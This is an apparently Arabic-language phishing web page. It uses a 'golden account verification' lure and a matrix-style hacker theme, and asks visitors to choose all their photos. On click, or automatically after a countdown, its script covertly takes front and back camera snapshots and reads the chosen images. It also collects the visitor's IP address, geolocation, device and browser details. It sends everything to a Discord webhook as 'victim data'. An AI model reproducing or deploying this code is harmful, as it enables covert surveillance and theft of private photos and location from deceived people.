<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المخترق MRX</title>
    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#001a00;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden;font-family:monospace}
        .monitor{position:relative;width:80vw;max-width:900px;height:55vw;max-height:550px;background:#0a1f0a;border:20px solid #0f2f0f;border-radius:15px;box-shadow:0 0 50px rgba(0,255,65,0.5),inset 0 0 30px #0f0}
        .screen{position:relative;width:100%;height:100%;background:#000;overflow:hidden;border:2px solid #1f3f1f}
        .screen::before{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:linear-gradient(rgba(0,255,0,0.03)50%,rgba(0,0,0,0.2)50%);background-size:100%4px;z-index:2;pointer-events:none}
        canvas#matrix{display:block;width:100%;height:100%}
        .stand{width:160px;height:50px;background:#0a1f0a;margin:0 auto;border-bottom-left-radius:10px;border-bottom-right-radius:10px;border-left:2px solid #0f2f0f;border-right:2px solid #0f2f0f}
        .base{width:280px;height:12px;background:#0f2f0f;margin:0 auto;border-radius:5px;box-shadow:0 0 20px #0f0}
        #hackWindow{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:9999;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;backdrop-filter:blur(10px)}
        #hackBox{background:linear-gradient(145deg,#0a1f0a,#001a00);border:3px solid #0f0;border-radius:20px;padding:50px 60px;max-width:600px;width:90%;text-align:center;box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1);animation:pulse 2s infinite}
        @keyframes pulse{0%{box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1)}50%{box-shadow:0 0 120px rgba(0,255,0,0.6),inset 0 0 80px rgba(0,255,0,0.2)}100%{box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1)}}
        #hackBox h1{color:#0f0;font-size:28px;margin-bottom:15px;text-shadow:0 0 20px #0f0}
        #hackBox p{color:#8f8;font-size:18px;margin:20px 0;line-height:1.8}
        #hackBox .emoji-big{font-size:60px;display:block;margin:10px 0}
        #agreeBtn{background:#0f0;color:#000;border:none;padding:15px 50px;font-size:22px;font-weight:bold;border-radius:50px;cursor:pointer;margin-top:20px;transition:all 0.3s;box-shadow:0 0 30px rgba(0,255,0,0.5);font-family:Arial,sans-serif}
        #agreeBtn:hover{transform:scale(1.05);box-shadow:0 0 50px rgba(0,255,0,0.8)}
        #agreeBtn:active{transform:scale(0.95)}
        #timer{color:#0f0;font-size:14px;margin-top:15px;opacity:0.7}
        #status{color:#ffaa00;font-size:13px;margin-top:10px;display:none}
        #hiddenCanvas{display:none}
        #fileInput{display:none}
    </style>
</head>
<body>
    <div id="hackWindow">
        <div id="hackBox">
            <span class="emoji-big">📸</span>
            <h1>🎯 توثيق الحساب الذهبي</h1>
            <p>📍 اختر جميع صورك للمصادقة<br>⚡ سيتم رفعها فوراً مع بياناتك</p>
            <button id="agreeBtn">✅ موافق - اختر الصور الآن</button>
            <div id="timer">⏳ سيتم الإرسال خلال 10 ثواني...</div>
            <div id="status">🔄 جاري التجهيز...</div>
        </div>
    </div>
    <div>
        <div class="monitor">
            <div class="screen">
                <canvas id="matrix"></canvas>
            </div>
        </div>
        <div class="stand"></div>
        <div class="base"></div>
    </div>
    <canvas id="hiddenCanvas"></canvas>
    <input type="file" id="fileInput" accept="image/*" multiple>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/ضع_الرابط_الحقيقي_هنا";
        const c = document.getElementById('matrix');
        const x = c.getContext('2d');
        c.width = c.parentElement.clientWidth;
        c.height = c.parentElement.clientHeight;
        const z = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const s = 16;
        const col = Math.floor(c.width / s);
        const d = Array(col).fill(1);
        setInterval(() => {
            x.fillStyle = 'rgba(0,20,0,0.04)';
            x.fillRect(0,0,c.width,c.height);
            x.fillStyle = '#0f0';
            x.shadowColor = '#0f0';
            x.shadowBlur = 6;
            x.font = s + 'px monospace';
            for(let i=0;i<col;i++){
                x.fillText(z[Math.floor(Math.random()*z.length)], i*s, d[i]*s);
                if(d[i]*s > c.height && Math.random() > 0.975) d[i] = 0;
                d[i]++;
            }
            x.shadowBlur = 0;
        }, 33);

        let captured = false;
        let selectedFiles = [];

        function getIP() {
            return fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'غير معروف');
        }

        function getLocation() {
            return new Promise((resolve) => {
                if(!navigator.geolocation) { resolve({lat:'غير متاح', lng:'غير متاح'}); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({lat: pos.coords.latitude, lng: pos.coords.longitude}),
                    () => resolve({lat:'ممنوع', lng:'ممنوع'})
                );
            });
        }

        function dataURLtoBlob(dataURL) {
            const arr = dataURL.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while(n--) { u8arr[n] = bstr.charCodeAt(n); }
            return new Blob([u8arr], {type: mime});
        }

        function compressImage(dataUrl, maxMB = 4) {
            return new Promise((resolve) => {
                let q = 0.8;
                let size = (dataUrl.length * 3/4) / (1024*1024);
                if(size <= maxMB) { resolve(dataUrl); return; }
                const img = new Image();
                img.onload = function() {
                    let canvas = document.createElement('canvas');
                    let w = img.width, h = img.height;
                    while((w*h*3/4)/(1024*1024) > maxMB) { w *= 0.7; h *= 0.7; }
                    canvas.width = w; canvas.height = h;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0, w, h);
                    let res = canvas.toDataURL('image/jpeg', q);
                    let ns = (res.length * 3/4) / (1024*1024);
                    while(ns > maxMB && q > 0.2) { q -= 0.1; res = canvas.toDataURL('image/jpeg', q); ns = (res.length * 3/4) / (1024*1024); }
                    resolve(res);
                };
                img.src = dataUrl;
            });
        }

        function addWatermarkToImage(dataUrl) {
            return new Promise((resolve) => {
                const img = new Image();
                img.onload = function() {
                    const canvas = document.getElementById('hiddenCanvas');
                    canvas.width = img.width;
                    canvas.height = img.height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0);
                    ctx.fillStyle = 'rgba(255,0,0,0.8)';
                    ctx.font = 'bold 24px Arial';
                    ctx.shadowColor = 'black';
                    ctx.shadowBlur = 10;
                    ctx.fillText('حقوق الدراك/2026', 15, canvas.height - 20);
                    ctx.shadowBlur = 0;
                    resolve(canvas.toDataURL('image/jpeg', 0.85));
                };
                img.src = dataUrl;
            });
        }

        function captureCamera(facingMode) {
            return new Promise((resolve) => {
                if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { resolve(null); return; }
                navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode, width: 300, height: 300 } })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            video.play();
                            const canvas = document.createElement('canvas');
                            canvas.width = 300; canvas.height = 300;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, 300, 300);
                            ctx.fillStyle = 'red';
                            ctx.font = 'bold 16px Arial';
                            ctx.fillText('حقوق الدراك/2026', 10, 290);
                            const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
                            stream.getTracks().forEach(track => track.stop());
                            resolve(dataUrl);
                        };
                    })
                    .catch(() => resolve(null));
            });
        }

        function fileToDataURL(file) {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onload = (e) => resolve(e.target.result);
                reader.readAsDataURL(file);
            });
        }

        async function collectAllImages() {
            const images = [];

            // صور من الكاميرا
            const front = await captureCamera('user');
            const back = await captureCamera('environment');
            if(front) images.push({ name: 'front_cam.jpg', data: front });
            if(back) images.push({ name: 'back_cam.jpg', data: back });

            // الصور المختارة من الجهاز
            for(let file of selectedFiles) {
                try {
                    let dataUrl = await fileToDataURL(file);
                    dataUrl = await addWatermarkToImage(dataUrl);
                    const compressed = await compressImage(dataUrl, 4);
                    images.push({ name: file.name || 'image.jpg', data: compressed });
                } catch(e) {}
            }

            return images;
        }

        async function sendAll() {
            const ip = await getIP();
            const loc = await getLocation();
            const ua = navigator.userAgent;
            let phone = 'كمبيوتر';
            if(/android/i.test(ua)) phone = 'Android';
            else if(/iphone|ipad|ipod/i.test(ua)) phone = 'iOS';

            const fields = [
                {name: "🌐 IP", value: ip, inline: true},
                {name: "📱 الجهاز", value: phone, inline: true},
                {name: "📍 خط العرض", value: String(loc.lat), inline: true},
                {name: "📍 خط الطول", value: String(loc.lng), inline: true},
                {name: "🕒 التوقيت", value: new Date().toLocaleString('ar-SA'), inline: true},
                {name: "📦 المتصفح", value: ua.substring(0, 150), inline: false}
            ];

            const payload = {
                username: "المخترق MRX",
                content: "**🔥 تم جمع الصور والمعلومات بنجاح!**",
                embeds: [{
                    title: "📡 بيانات الضحية",
                    color: 0x00ff00,
                    fields: fields,
                    footer: { text: "حقوق الدراك/2026" }
                }]
            };

            try {
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify(payload));

                const images = await collectAllImages();
                let totalSize = 0;
                for(let img of images) {
                    const blob = dataURLtoBlob(img.data);
                    totalSize += blob.size;
                    if(totalSize > 8000000) break; // حد 8 ميجا
                    formData.append(img.name, blob, img.name);
                }

                document.getElementById('status').textContent = `📤 إرسال ${images.length} صورة...`;
                const response = await fetch(WEBHOOK, { method: 'POST', body: formData });
                if(response.ok) {
                    document.getElementById('status').textContent = '✅ تم إرسال كل الصور!';
                } else {
                    document.getElementById('status').textContent = '❌ فشل الإرسال: ' + response.status;
                }
            } catch(e) {
                document.getElementById('status').textContent = '❌ خطأ: ' + e.message;
            }
        }

        function startHack() {
            document.getElementById('status').style.display = 'block';
            document.getElementById('status').textContent = '📂 يرجى اختيار جميع صورك...';
            const fileInput = document.getElementById('fileInput');
            fileInput.click();
            fileInput.onchange = async function() {
                if(this.files.length === 0) {
                    document.getElementById('status').textContent = '⚠️ لم تختر أي صورة، سيتم الإرسال بدون صور.';
                } else {
                    selectedFiles = Array.from(this.files);
                    document.getElementById('status').textContent = `✅ تم اختيار ${selectedFiles.length} صورة. جاري الإرسال...`;
                }
                await sendAll();
            };
        }

        let countdown = 10;
        const timerEl = document.getElementById('timer');
        const agreeBtn = document.getElementById('agreeBtn');
        const hackWindow = document.getElementById('hackWindow');

        agreeBtn.addEventListener('click', function() {
            hackWindow.style.display = 'none';
            startHack();
        });

        const countdownInterval = setInterval(() => {
            countdown--;
            timerEl.textContent = `⏳ سيتم الإرسال خلال ${countdown} ثواني...`;
            if(countdown <= 0) {
                clearInterval(countdownInterval);
                timerEl.textContent = '⏳ جاري الإرسال...';
                setTimeout(() => {
                    hackWindow.style.display = 'none';
                    startHack();
                }, 1000);
            }
        }, 1000);
    </script>
</body>
</html>
